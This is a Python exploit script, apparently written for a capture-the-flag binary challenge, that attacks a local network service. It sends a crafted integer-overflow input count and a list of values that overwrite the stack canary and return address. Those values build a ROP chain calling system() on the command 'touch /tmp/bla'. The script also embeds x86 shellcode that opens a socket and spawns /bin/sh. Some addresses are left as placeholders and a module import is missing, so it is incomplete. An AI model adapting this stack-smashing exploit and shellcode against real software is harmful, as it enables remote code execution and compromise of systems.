#!/usr/bin/python

import socket
import sys

HOST='127.0.0.1'
PORT=5001


shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((HOST,PORT))

# rbp      : saved rbp
# rbp-0x8  : cookie -> 19
# rbp-0x50 : i -> 10
# rbp-0x58 : longs ->9
# rbp-0x60 : nb_inputs -> 8
# rbp-0x6c : r -> 6 + 1/2
# rbp-0X74 : socks -> 5 +1/2
cookie = 0x16878e19759c7e00
saved_rbp = 0x7fffffffe400
ptr_longs = 0x7fffffffe360

base_address_chall = XXXX
base_address_libc = XXX

# pop_rdi_retn obtenu grâce au tool rp
gadget_pop_rdi_retn = 0x1633 + base_address_chall
address_payload = 25*8+ptr_longs
address_system = 283536 + base_address_libc
address_exit = 237616 + base_address_libc

values={
    10:10,
    9:ptr_longs,
    8:100,
    5:4 << 32,
    19:cookie,
    21:gadget_pop_rdi_retn,
    22:address_payload,
    23:address_system,
    24:address_exit
}

payload = "touch /tmp/bla"
payload = payload + "\x00" * (8 - len(payload)%8)
for i in xrange(0, len(payload), 8):
    values[25 + i/8] = struct.pack('<Q', payload[i:i+8])[0]

#s.send('2\n30\n34')  
s.send("1\n") # operation
s.send("%d\n"%((2**64+0x10)/8))  #nb inputs
for i in xrange(100):
    s.send("%d\n"%values.get(i,0))

tmp=s.recv(1024)
while tmp:
    sys.stdout.write(tmp)
    tmp=s.recv(1024)

